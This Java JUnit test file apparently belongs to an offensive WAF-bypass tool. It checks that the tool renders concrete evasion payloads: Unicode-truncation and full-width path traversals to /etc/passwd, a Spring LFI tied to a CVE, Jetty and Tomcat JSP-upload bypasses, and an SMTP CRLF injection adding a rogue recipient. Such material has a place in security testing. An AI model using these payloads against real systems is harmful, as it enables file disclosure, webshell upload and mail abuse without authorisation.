package Main.ghostbits;

import org.junit.Before;
import org.junit.Test;
import org.yaml.snakeyaml.Yaml;

import java.io.InputStream;
import java.net.URLDecoder;
import java.util.Arrays;
import java.util.Map;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertTrue;

/**
 * GhostBitsEngine 核心折叠/展开逻辑测试。
 * 这些用例对应 PPT 里的"金句 payload"，是阶段 1 的验收标准。
 */
public class GhostBitsEngineTest {

    private GhostBitsEngine engine;
    private GhostBitsRule rule;

    @Before
    public void setUp() throws Exception {
        try (InputStream in = getClass().getClassLoader().getResourceAsStream("BypassPro-config.yaml")) {
            assertNotNull("BypassPro-config.yaml must be on classpath", in);
            Yaml yaml = new Yaml();
            @SuppressWarnings("unchecked")
            Map<String, Object> config = yaml.load(in);
            @SuppressWarnings("unchecked")
            Map<String, Object> profiles = (Map<String, Object>) config.get("profiles");
            @SuppressWarnings("unchecked")
            Map<String, Object> manualWaf = (Map<String, Object>) profiles.get("manual_waf_bypass");
            @SuppressWarnings("unchecked")
            Map<String, Object> ghostBits = (Map<String, Object>) manualWaf.get("ghost_bits");
            rule = GhostBitsRule.fromMap(ghostBits);
            engine = new GhostBitsEngine(rule);
        }
    }

    // ------------------------------------------------------------------
    // (byte) ch 折叠正确性
    // ------------------------------------------------------------------

    @Test
    public void foldDotU002eSequenceMatchesPpt() {
        // 阮严灵丰丰甲来 -> .%u002e
        String seq = rule.getSequence("dot_u002e");
        assertNotNull(seq);
        assertEquals(".%u002e", GhostBitsEngine.foldToAscii(seq));
    }

    @Test
    public void foldCrlfSequenceMatchesPpt() {
        // 瘍瘊 -> \r\n
        String seq = rule.getSequence("crlf");
        assertNotNull(seq);
        assertArrayEquals(new byte[]{0x0D, 0x0A}, GhostBitsEngine.foldToBytes(seq));
    }

    @Test
    public void foldJspSequenceMatchesPpt() {
        // 陪sp -> jsp
        String seq = rule.getSequence("jsp_ext");
        assertNotNull(seq);
        assertEquals("jsp", GhostBitsEngine.foldToAscii(seq));
    }

    @Test
    public void foldIndividualGhostChars() {
        assertEquals('.', (char) (((char) 0x962E) & 0xFF)); // 阮
        assertEquals('%', (char) (((char) 0x4E25) & 0xFF)); // 严
        assertEquals('u', (char) (((char) 0x7075) & 0xFF)); // 灵
        assertEquals('0', (char) (((char) 0x4E30) & 0xFF)); // 丰
        assertEquals('2', (char) (((char) 0x7532) & 0xFF)); // 甲
        assertEquals('e', (char) (((char) 0x6765) & 0xFF)); // 来
        assertEquals('j', (char) (((char) 0x966A) & 0xFF)); // 陪
        assertEquals('\r', (char) (((char) 0x760D) & 0xFF)); // 瘍
        assertEquals('\n', (char) (((char) 0x760A) & 0xFF)); // 瘊
    }

    // ------------------------------------------------------------------
    // 候选枚举
    // ------------------------------------------------------------------

    @Test
    public void findCandidatesUsesConfiguredFirst() {
        // YAML 里 "." 配了 ["阮"]
        assertEquals(Arrays.asList("阮"), engine.findCandidates("."));
    }

    @Test
    public void findCandidatesEnumeratesWhenEmpty() {
        // YAML 里 "@" 配了 []，应触发 0x01..0xFF 枚举（剔除 surrogate）
        java.util.List<String> candidates = engine.findCandidates("@");
        assertFalse(candidates.isEmpty());
        // 不应包含 ASCII 自身
        assertFalse(candidates.contains("@"));
        // 必须包含一些 BMP 字符，比如 U+0140 (Ŀ) -> 低 8 位 0x40
        assertTrue("expected to contain candidates with low byte 0x40",
                candidates.stream().anyMatch(s -> (s.charAt(0) & 0xFF) == 0x40));
        // 所有候选低 8 位必须等于 0x40
        for (String c : candidates) {
            assertEquals(0x40, c.charAt(0) & 0xFF);
        }
    }

    @Test
    public void enumerateSkipsSurrogates() {
        java.util.List<String> all = engine.enumerateCandidates((char) 0x00);
        for (String c : all) {
            int code = c.charAt(0);
            assertFalse("surrogate must be skipped: " + Integer.toHexString(code),
                    code >= 0xD800 && code <= 0xDFFF);
        }
    }

    // ------------------------------------------------------------------
    // 模板渲染
    // ------------------------------------------------------------------

    @Test
    public void renderSpringStaticLfiTemplate() {
        String rendered = engine.renderTemplate("spring_static_lfi");
        // 模板: /{{seq:dot_u002e}}/{{seq:dot_u002e}}/{{seq:dot_u002e}}/etc/passw{{url:d}}
        // dot_u002e = 阮严灵丰丰甲来
        // url:d = %64
        assertEquals("/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64", rendered);
    }

    @Test
    public void renderSpringStaticLfiFoldedMatchesAttackChain() {
        // 渲染结果折叠后应该能看到 .%u002e 重复 + /etc/passw%64
        String rendered = engine.renderTemplate("spring_static_lfi");
        String folded = GhostBitsEngine.foldToAscii(rendered);
        assertEquals("/.%u002e/.%u002e/.%u002e/etc/passw%64", folded);
    }

    @Test
    public void renderJettyLooseHexTemplate() {
        String rendered = engine.renderTemplate("jetty_loose_hex");
        assertEquals("/setup/setup-s/%2>%2>/%2>%2>/log.jsp", rendered);
    }

    @Test
    public void renderFullwidthTraversalTemplateIsOriginFormPath() {
        String rendered = engine.renderTemplate("fullwidth_traversal");
        assertEquals("/%２ｅ%２ｅ%２ｆ%２ｅ%２ｅ%２ｆetc%２ｆpasswd", rendered);
    }

    @Test
    public void renderJdkUrlDecoderUnicodeDigitTemplate() {
        String rendered = engine.renderTemplate("jdk_urldecoder_unicode_digit");
        assertEquals("/%٢e%٢e/%٢e%٢e/%٢e%٢e/etc/passwd", rendered);
    }

    @Test
    public void jdkUrlDecoderUnicodeDigitTemplateDecodesToTraversal() throws Exception {
        String rendered = engine.renderTemplate("jdk_urldecoder_unicode_digit");
        assertEquals("/../../../etc/passwd", URLDecoder.decode(rendered, "UTF-8"));
    }

    @Test
    public void fullwidthTraversalTemplateDecodesToTraversal() throws Exception {
        String rendered = engine.renderTemplate("fullwidth_traversal");
        assertEquals("/../../etc/passwd", URLDecoder.decode(rendered, "UTF-8"));
    }

    @Test
    public void renderTomcatJspUploadTemplate() {
        String rendered = engine.renderTemplate("tomcat_jsp_upload");
        assertEquals("1.陪sp", rendered);
        assertEquals("1.jsp", GhostBitsEngine.foldToAscii(rendered));
    }

    @Test
    public void renderTomcatUrlHexGhostTemplate() {
        String rendered = engine.renderTemplate("tomcat_url_hex_ghost");
        assertEquals("1.%鸶繡sp", rendered);
        assertEquals('6', (char) (rendered.charAt(3) & 0x7F));
        assertEquals('a', (char) (rendered.charAt(4) & 0x7F));
    }

    @Test
    public void bcelTemplateKeepsLiteralPrefix() {
        String rendered = engine.renderTemplate("bcel_ghost_bits");
        assertEquals("$$BCEL$$", rendered);
    }

    @Test
    public void renderAngusSmtpCrlfTemplate() {
        String rendered = engine.renderTemplate("angus_smtp_crlf");
        // 模板: <a@b.com>{{seq:crlf}}RCPT TO:<x@evil>{{seq:crlf}}
        // crlf = 瘍瘊
        assertEquals("<a@b.com>瘍瘊RCPT TO:<x@evil>瘍瘊", rendered);
        // 折叠后应该出现真实 CRLF
        byte[] folded = GhostBitsEngine.foldToBytes(rendered);
        // 找两个 \r\n
        int crlfCount = 0;
        for (int i = 0; i + 1 < folded.length; i++) {
            if (folded[i] == 0x0D && folded[i + 1] == 0x0A) crlfCount++;
        }
        assertEquals(2, crlfCount);
    }

    // ------------------------------------------------------------------
    // 占位符细节
    // ------------------------------------------------------------------

    @Test
    public void renderPatternRepeat() {
        assertEquals("瘍瘊瘍瘊瘍瘊", engine.renderPattern("{{repeat:crlf:3}}"));
    }

    @Test
    public void renderPatternUnknownTokenLeftAsIs() {
        assertEquals("hello {{foo:bar}} world",
                engine.renderPattern("hello {{foo:bar}} world"));
    }

    @Test
    public void renderPatternAtomWithIndex() {
        // 配置里 "." 只有一个候选，越界回退到 0
        assertEquals("阮", engine.renderPattern("{{atom:.:5}}"));
    }

    @Test
    public void renderPatternEscapedNewline() {
        // {{atom:\r}} 应取到瘍
        assertEquals("瘍", engine.renderPattern("{{atom:\\r}}"));
        assertEquals("瘊", engine.renderPattern("{{atom:\\n}}"));
    }

    @Test
    public void renderPatternUrlMultiByte() {
        // url:d 应得到 %64
        assertEquals("%64", engine.renderPattern("{{url:d}}"));
    }

    // ------------------------------------------------------------------
    // 模板元数据
    // ------------------------------------------------------------------

    @Test
    public void springTemplateRequiresRawSender() {
        GhostBitsRule.Template t = rule.getTemplate("spring_static_lfi");
        assertNotNull(t);
        assertTrue(t.requiresRawSender());
        assertEquals("Spring", t.getCategory());
        assertEquals("CVE-2025-41242", t.getCve());
    }

    @Test
    public void jettyTemplateUsesAnySender() {
        GhostBitsRule.Template t = rule.getTemplate("jetty_loose_hex");
        assertNotNull(t);
        assertFalse(t.requiresRawSender());
    }

    // ------------------------------------------------------------------
    // 工具
    // ------------------------------------------------------------------

    private static void assertArrayEquals(byte[] expected, byte[] actual) {
        org.junit.Assert.assertArrayEquals(expected, actual);
    }
}
